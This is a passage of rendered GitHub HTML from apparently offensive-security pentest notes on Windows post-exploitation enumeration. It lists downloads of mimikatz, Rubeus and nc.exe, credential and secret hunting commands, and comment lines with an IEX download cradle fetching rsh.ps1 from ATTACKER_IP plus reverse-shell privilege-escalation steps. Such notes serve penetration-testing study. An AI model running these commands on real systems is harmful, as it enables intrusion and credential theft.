= Normal    window\u003c/span\u003e\n\u003cspan class=\"pl-smi\"\u003e$shortcut\u003cspan class=\"pl-smi\"\u003e.Save\u003c/span\u003e\u003c/span\u003e()\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e source: https://v3ded.github.io/redteam/abusing-lnk-features-for-initial-access-and-persistence\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eReferences:\u003c/p\u003e\n\u003cul dir=\"auto\"\u003e\n\u003cli\u003e\u003ca href=\"https://learn.microsoft.com/en-us/windows/win32/shell/library-schema-entry\" rel=\"nofollow\"\u003eLibrary Description Schema\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch1 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e4 Windows\u003c/h1\u003e\u003ca id=\"user-content-4-windows\" class=\"anchor\" aria-label=\"Permalink: 4 Windows\" href=\"#4-windows\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch2 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e4.1 Basic Windows Post-Exploit Enumeration\u003c/h2\u003e\u003ca id=\"user-content-41-basic-windows-post-exploit-enumeration\" class=\"anchor\" aria-label=\"Permalink: 4.1 Basic Windows Post-Exploit Enumeration\" href=\"#41-basic-windows-post-exploit-enumeration\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eThere are several key pieces of information we should always obtain:\u003c/p\u003e\n\u003cdiv class=\"snippet-clipboard-content notranslate position-relative overflow-auto\" data-snippet-clipboard-copy-content=\"- Username and hostname\n- Group memberships of the current user\n- Existing users and groups\n- Operating system, version and architecture\n- Network information (all interfaces, routes, and listening/active connections)\n- Installed applications\n- Running processes\"\u003e\u003cpre class=\"notranslate\"\u003e\u003ccode\u003e- Username and hostname\n- Group memberships of the current user\n- Existing users and groups\n- Operating system, version and architecture\n- Network information (all interfaces, routes, and listening/active connections)\n- Installed applications\n- Running processes\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eAutomate your enumeration with WinPEAS, etc.:\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# WinPEAS for automated Windows enumeration\nwget -O winpeas.exe https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASany_ofs.exe\n\n# PowerUp for Winodws privilege escalation\ncp /usr/share/powershell-empire/empire/server/data/module_source/privesc/PowerUp.ps1 .\n\n# PowerView for manual AD enumeration\ncp /usr/share/windows-resources/powersploit/Recon/PowerView.ps1 .\n\n# SharpHound for automated AD enumeration\ncp /usr/share/metasploit-framework/data/post/powershell/SharpHound.ps1 .\n\n# sysinternals suite in case you need it\nwget -O sysinternals.zip https://download.sysinternals.com/files/SysinternalsSuite.zip\nunzip -d sysinternals sysinternals.zip\n\n# Invoke-Mimikatz.ps1 and mimikatz.exe for hashes/tokens\ncp /usr/share/windows-resources/powersploit/Exfiltration/Invoke-Mimikatz.ps1 .\ncp /usr/share/windows-resources/mimikatz/Win32/mimikatz.exe ./mimikatz32.exe\ncp /usr/share/windows-resources/mimikatz/x64/mimikatz.exe ./mimikatz64.exe\nwget -O mimikatz.zip https://github.com/gentilkiwi/mimikatz/releases/latest/download/mimikatz_trunk.zip\nunzip -d mimikatz mimikatz.zip\n\n# Rubeus.exe for AS-REP roasting, etc.\nwget -O Rubeus.exe https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Rubeus.exe\n\n# chisel for port redirection/tunneling\necho 'DOWNLOAD chisel!'\necho 'https://github.com/jpillora/chisel/releases'\n\n# plink.exe for port redirection/tunneling\ncp /usr/share/windows-resources/binaries/plink.exe .\n\n# nc.exe for reverse/bind shells and port redirection\ncp /usr/share/windows-resources/binaries/nc.exe .\n\n# JAWS - invoke with: powershell -exec Bypass -File .\\jaws-enum.ps1\nwget https://raw.githubusercontent.com/411Hall/JAWS/master/jaws-enum.ps1\n# https://github.com/GhostPack/Seatbelt\nwget https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Seatbelt.exe\n# for older machines\nwget https://github.com/carlospolop/winPE/raw/master/binaries/accesschk-xp/accesschk-2003-xp.exe\n\n\n\n# host the files on a Windows 10+ compatible SMB share\nimpacket-smbserver -smb2support -user derp -password herpderp share .\n\n# on windows host:\n\\\\ATTACKER_IP\\share\\winpeas.exe\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e WinPEAS for automated Windows enumeration\u003c/span\u003e\nwget -O winpeas.exe https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASany_ofs.exe\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e PowerUp for Winodws privilege escalation\u003c/span\u003e\ncp /usr/share/powershell-empire/empire/server/data/module_source/privesc/PowerUp.ps1 \u003cspan class=\"pl-c1\"\u003e.\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e PowerView for manual AD enumeration\u003c/span\u003e\ncp /usr/share/windows-resources/powersploit/Recon/PowerView.ps1 \u003cspan class=\"pl-c1\"\u003e.\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e SharpHound for automated AD enumeration\u003c/span\u003e\ncp /usr/share/metasploit-framework/data/post/powershell/SharpHound.ps1 \u003cspan class=\"pl-c1\"\u003e.\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e sysinternals suite in case you need it\u003c/span\u003e\nwget -O sysinternals.zip https://download.sysinternals.com/files/SysinternalsSuite.zip\nunzip -d sysinternals sysinternals.zip\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Invoke-Mimikatz.ps1 and mimikatz.exe for hashes/tokens\u003c/span\u003e\ncp /usr/share/windows-resources/powersploit/Exfiltration/Invoke-Mimikatz.ps1 \u003cspan class=\"pl-c1\"\u003e.\u003c/span\u003e\ncp /usr/share/windows-resources/mimikatz/Win32/mimikatz.exe ./mimikatz32.exe\ncp /usr/share/windows-resources/mimikatz/x64/mimikatz.exe ./mimikatz64.exe\nwget -O mimikatz.zip https://github.com/gentilkiwi/mimikatz/releases/latest/download/mimikatz_trunk.zip\nunzip -d mimikatz mimikatz.zip\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Rubeus.exe for AS-REP roasting, etc.\u003c/span\u003e\nwget -O Rubeus.exe https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Rubeus.exe\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e chisel for port redirection/tunneling\u003c/span\u003e\n\u003cspan class=\"pl-c1\"\u003eecho\u003c/span\u003e \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003eDOWNLOAD chisel!\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"pl-c1\"\u003eecho\u003c/span\u003e \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003ehttps://github.com/jpillora/chisel/releases\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e plink.exe for port redirection/tunneling\u003c/span\u003e\ncp /usr/share/windows-resources/binaries/plink.exe \u003cspan class=\"pl-c1\"\u003e.\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e nc.exe for reverse/bind shells and port redirection\u003c/span\u003e\ncp /usr/share/windows-resources/binaries/nc.exe \u003cspan class=\"pl-c1\"\u003e.\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e JAWS - invoke with: powershell -exec Bypass -File .\\jaws-enum.ps1\u003c/span\u003e\nwget https://raw.githubusercontent.com/411Hall/JAWS/master/jaws-enum.ps1\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e https://github.com/GhostPack/Seatbelt\u003c/span\u003e\nwget https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Seatbelt.exe\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e for older machines\u003c/span\u003e\nwget https://github.com/carlospolop/winPE/raw/master/binaries/accesschk-xp/accesschk-2003-xp.exe\n\n\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e host the files on a Windows 10+ compatible SMB share\u003c/span\u003e\nimpacket-smbserver -smb2support -user derp -password herpderp share \u003cspan class=\"pl-c1\"\u003e.\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e on windows host:\u003c/span\u003e\n\u003cspan class=\"pl-cce\"\u003e\\\\\u003c/span\u003eATTACKER_IP\u003cspan class=\"pl-cce\"\u003e\\s\u003c/span\u003ehare\u003cspan class=\"pl-cce\"\u003e\\w\u003c/span\u003einpeas.exe\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eCommands to run:\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-powershell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# Basic System Info\nsysteminfo\nhostname\n\n# Who am I?\nwhoami /all\necho %username%\n\n# powershell way to check Integrity Level of another process\nImport-Module NtObjectManager\nGet-NtTokenIntegrityLevel\n\n# What users/localgroups are on the machine?\nnet user\nnet localgroup\npowershell -c Get-LocalUser\npowershell -c Get-LocalGroup\n# Interesting built-in groups:\n# Administrators - can do it all\n# Remote Desktop Users - can use RDP\n# Remote Management Users - can use WinRM\n# Backup Operators - can backup and restore all files\n\n# Who has local admin privileges?\nnet localgroup Administrators\npowershell -c 'Get-LocalGroupMember Administrators'\n\n# More info about a specific user. Check if user has privileges.\nnet user SOMEUSER\n\n# Network Info\nipconfig /all\nroute print\nnetstat -ano\narp -a\n\n# Firewall\nnetsh firewall show state\nnetsh firewall show config\n\n# Installed Software\ndir /b/a:d \u0026quot;C:\\Program files\u0026quot; \u0026quot;C:\\Program Files (x86)\u0026quot; | sort /unique\nwmic product get name,version\npowershell -c \u0026quot;Get-WmiObject -Class Win32_Product | Select-Object -Property Name,Version\u0026quot;\npowershell -c \u0026quot;Get-ItemProperty HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* | select displayname, DisplayVersion\u0026quot;\npowershell -c \u0026quot;Get-ItemProperty HKLM:\\Software\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* | Select-Object DisplayName, DisplayVersion\u0026quot;\n\n# Processes\ntasklist\npowershell -c \u0026quot;get-process\u0026quot;\nwmic process get processid,caption,executablepath,commandline,description\n\n# Hard disks\nfsutil fsinfo drives\n\n# User environment\nset\n\n# How well patched is the system? (Hotfixes)\nwmic qfe get Caption,Description,HotFixID,InstalledOn\n\n# Scheduled Tasks\nschtasks\n# more verbose list\nschtasks /query /fo list /v\n\n# Services running\n# Get-CimInstance supercedes Get-WmiObject\nGet-CimInstance -ClassName win32_service | Where-Object {$_.State -like 'Running' -and $_.PathName -notlike 'C:\\Windows\\System32\\*'} | select Name,PathName\n# alternatively\nwmic service where \u0026quot;started=true and not pathname like 'C:\\\\Windows\\\\System32\\\\%'\u0026quot; get name,pathname\n# old school way\ntasklist /svc\nnet start\nsc queryex type= service state= active\n# List all services\npowershell -c \u0026quot;get-service\u0026quot;\nsc queryex type= service state= all\n# names only\nsc queryex type= service state= all | find /i \u0026quot;SERVICE_NAME:\u0026quot;\n# Stopped services\nsc queryex type= service state= inactive\n# Check a service's config settings (look for unquoted service path in BINARY_PATH_NAME)\nsc qc SERVICENAME\n\n# check powershell history\npowershell -c Get-History\n\n# locate PowerShell logfile (PSReadline)\npowershell -c \u0026quot;(Get-PSReadlineOption).HistorySavePath\u0026quot;\n# if you get a path, use type to view the file\n\n# check if heavier PowerShell logging is enabled\nreg query HKLM\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging\nreg query HKLM\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\Transcription\n# if so, view powershell command history with:\nGet-WinEvent Microsoft-Windows-PowerShell/Operational | Where-Object Id -eq 4104 | select message | fl\n# search powershell history for secrets:\nGet-WinEvent Microsoft-Windows-PowerShell/Operational | Where-Object Id -eq 4104 | select message | Select-String -Pattern \u0026quot;secret\u0026quot; # also try 'secur' and 'passw'\n\n# User files that may have juicy data\npowershell -c \u0026quot;Get-ChildItem -Path C:\\Users\\ -Exclude Desktop.ini -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*.gpg,*.kdbx,*.ini,*.pst,*.ost,*.eml,*.msg,*.log,id_* -File -Recurse -ErrorAction SilentlyContinue\u0026quot;\n# alternative\ndir /a-d /s/b C:\\users | findstr /ilvC:\\AppData\\ /C:\\desktop.ini /C:\\ntuser.dat /C:\u0026quot;\\All Users\\VMware\u0026quot; /C:\u0026quot;\\All Users\\USOShared\u0026quot; /C:\u0026quot;\\All Users\\Package\u0026quot; /C:\u0026quot;\\All Users\\Microsoft\u0026quot;\n\n# Check if plaintext creds stored by Wdigest (key exists, not set to 0)\n# typically only common in Windows 7 and earlier\nreg query HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential\n\n# LSA Protection enabled (key set to 1)?\nreg query HKLM\\SYSTEM\\CurrentControlSet\\Control\\LSA /v RunAsPPL\n\n# Credential Guard enabled (key set to 1 or 2)\nreg query HKLM\\System\\CurrentControlSet\\Control\\LSA /v LsaCfgFlags\n# win11 automatic virtualization based security enabled:\nreg query HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\MSV1_0 /v IsolatedCredentialsRootSecret\n# virualization based security enabled:\nreg query HKLM\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard /v EnableVirtualizationBasedSecurity\n# secure boot enabled:\nreg query HKLM\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard /v RequirePlatformSecurityFeatures\n\n# List saved credentials\ncmdkey /list\n# if found, might be able to pivot with:\n# wmic /node:VICTIM_IP process call create \u0026quot;cmd /c powershell -nop -noni -exec bypass -w hidden -c \\\u0026quot;IEX((new-object net.webclient).downloadstring('http://ATTACKER_IP/rsh.ps1'))\\\u0026quot;\u0026quot;\n# or steal creds with mimikatz\n\n# Run executable with saved creds (assuming listed in cmdkey output)\nrunas /savecred /user:admin C:\\Users\\Public\\revshell.exe\n\n# check account policy (lockout threshold)\nnet accounts\n\n# If both registry keys are set with DWORD values of 1, low-priv users can install *.msi files as NT AUTHORITY\\SYSTEM\nreg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\nreg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\n# to pwn: msiexec /quiet /qn /i C:\\Users\\Public\\revshell.msi\n\n# Does it have AutoRuns with weak permissions?\nreg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\nreg query HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\n\n# is UAC enabled? EnableLUA = 0x1 means enabled.\n# ConsentPromptBehaviorAdmin = 0x5 is default, requires UAC bypass with MS-signed binary using autoelevate\n# Bad = ConsentPrompt == 2 \u0026amp;\u0026amp; SecureDesktopPrompt == 1 (UAC is set to 'Always Notify')\nreg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\ /v EnableLUA\nreg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\ /v ConsentPromptBehaviorAdmin\nreg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\ /v PromptOnSecureDesktop\n\n# Can you control the registry of services?\npowershell -c \u0026quot;Get-Acl -Path hklm:\\System\\CurrentControlSet\\services\\regsvc | fl\u0026quot;\n# if NT AUTHORITY\\INTERACTIVE has \u0026quot;FullContol\u0026quot;, can pwn with:\n# see section: Windows Service Escalation - Registry\n\n# Can you put programs in the global startup folder?\nicacls.exe \u0026quot;C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\u0026quot;\n# look for (F), full access, or (W), write access\n# exploit by dropping reverse shell exe there, wait for admin to log in.\n\n# Do we have access to the SAM database? CVE-2021-36934, https://www.kb.cert.org/vuls/id/506989\nicacls %windir%\\system32\\config\\sam\n\n# Vulnerable to Print NightMare (CVE-2021-1675, CVE-2021-34527)?\n# Check running Print Spooler service using WMIC\nwmic service list brief | findstr \u0026quot;Spool\u0026quot;\npowershell Get-Service \u0026quot;Print Spooler\u0026quot;\n# Check Registry to ensure NoWarningNoElevationOnInstall and UpdatePromptSettings\n# either don't exist or are set to 0\nreg query \u0026quot;HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\Printers\\PointAndPrint\\NoWarningNoElevationOnInstall\u0026quot;\nreg query \u0026quot;HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\Printers\\PointAndPrint\\UpdatePromptSettings\u0026quot;\npowershell gci \u0026quot;HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\Printers\\PointAndPrint\u0026quot;\n\n# is WSL installed?\npowershell -c \u0026quot;Get-ChildItem HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Lxss | %{Get-ItemProperty $_.PSPath} | out-string -width 4096\u0026quot;\n\n# Check the powershell version\npowershell $PSVersionTable.PSVersion\npowershell (Get-Host).Version\npowershell $host.Version\n\n# Determine .NET version on machine (useful for running C# exploits)\ndir C:\\windows\\microsoft.net\\framework\\\n\n# Drivers\ndriverquery\n# Kernel Drivers (for exploit?)\ndriverquery | findstr Kernel\n# Filesystem drivers\ndriverquery | findstr \u0026quot;File System\u0026quot;\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Basic System Info\u003c/span\u003e\nsysteminfo\nhostname\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Who am I?\u003c/span\u003e\nwhoami \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003eall\necho \u003cspan class=\"pl-k\"\u003e%\u003c/span\u003eusername\u003cspan class=\"pl-k\"\u003e%\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e powershell way to check Integrity Level of another process\u003c/span\u003e\n\u003cspan class=\"pl-c1\"\u003eImport-Module\u003c/span\u003e NtObjectManager\n\u003cspan class=\"pl-c1\"\u003eGet-NtTokenIntegrityLevel\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e What users/localgroups are on the machine?\u003c/span\u003e\nnet user\nnet localgroup\npowershell \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003ec \u003cspan class=\"pl-c1\"\u003eGet-LocalUser\u003c/span\u003e\npowershell \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003ec \u003cspan class=\"pl-c1\"\u003eGet-LocalGroup\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Interesting built-in groups:\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Administrators - can do it all\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Remote Desktop Users - can use RDP\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Remote Management Users - can use WinRM\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Backup Operators - can backup and restore all files\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Who has local admin privileges?\u003c/span\u003e\nnet localgroup Administrators\npowershell \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003ec \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003eGet-LocalGroupMember Administrators\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e More info about a specific user. Check if user has privileges.\u003c/span\u003e\nnet user SOMEUSER\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Network Info\u003c/span\u003e\nipconfig \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003eall\nroute print\nnetstat \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003eano\narp \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003ea\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Firewall\u003c/span\u003e\nnetsh firewall show state\nnetsh firewall show config\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Installed Software\u003c/span\u003e\ndir \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003eb\u003cspan class=\"pl-k\"\u003e/\u003c/span\u003ea:d \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003eC:\\Program files\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003eC:\\Program Files (x86)\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e|\u003c/span\u003e sort \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003eunique\nwmic product get name\u003cspan class=\"pl-k\"\u003e,\u003c/span\u003eversion\npowershell \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003ec \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003eGet-WmiObject -Class Win32_Product | Select-Object -Property Name,Version\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e\npowershell \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003ec \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003eGet-ItemProperty HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* | select displayname, DisplayVersion\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e\npowershell \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003ec \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003eGet-ItemProperty HKLM:\\Software\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* | Select-Object DisplayName, DisplayVersion\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Processes\u003c/span\u003e\ntasklist\npowershell \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003ec \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003eget-process\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e\nwmic \u003cspan class=\"pl-k\"\u003eprocess\u003c/span\u003e get processid\u003cspan class=\"pl-k\"\u003e,\u003c/span\u003ecaption\u003cspan class=\"pl-k\"\u003e,\u003c/span\u003eexecutablepath\u003cspan class=\"pl-k\"\u003e,\u003c/span\u003ecommandline\u003cspan class=\"pl-k\"\u003e,\u003c/span\u003edescription\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Hard disks\u003c/span\u003e\nfsutil fsinfo drives\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e User environment\u003c/span\u003e\nset\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e How well patched is the system? (Hotfixes)\u003c/span\u003e\nwmic qfe get Caption\u003cspan class=\"pl-k\"\u003e,\u003c/span\u003eDescription\u003cspan class=\"pl-k\"\u003e,\u003c/span\u003eHotFixID\u003cspan class=\"pl-k\"\u003e,\u003c/span\u003eInstalledOn\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Scheduled Tasks\u003c/span\u003e\nschtasks\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e more verbose list\u003c/span\u003e\nschtasks \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003equery \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003efo list \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003ev\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Services running\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Get-CimInstance supercedes Get-WmiObject\u003c/span\u003e\n\u003cspan class=\"pl-c1\"\u003eGet-CimInstance\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003eClassName win32_service \u003cspan class=\"pl-k\"\u003e|\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003eWhere-Object\u003c/span\u003e {\u003cspan class=\"pl-c1\"\u003e$_\u003cspan class=\"pl-smi\"\u003e.State\u003c/span\u003e\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e-like\u003c/span\u003e \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003eRunning\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e-and\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e$_\u003cspan class=\"pl-smi\"\u003e.PathName\u003c/span\u003e\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e-notlike\u003c/span\u003e \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003eC:\\Windows\\System32\\*\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e} \u003cspan class=\"pl-k\"\u003e|\u003c/span\u003e select Name\u003cspan class=\"pl-k\"\u003e,\u003c/span\u003ePathName\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e 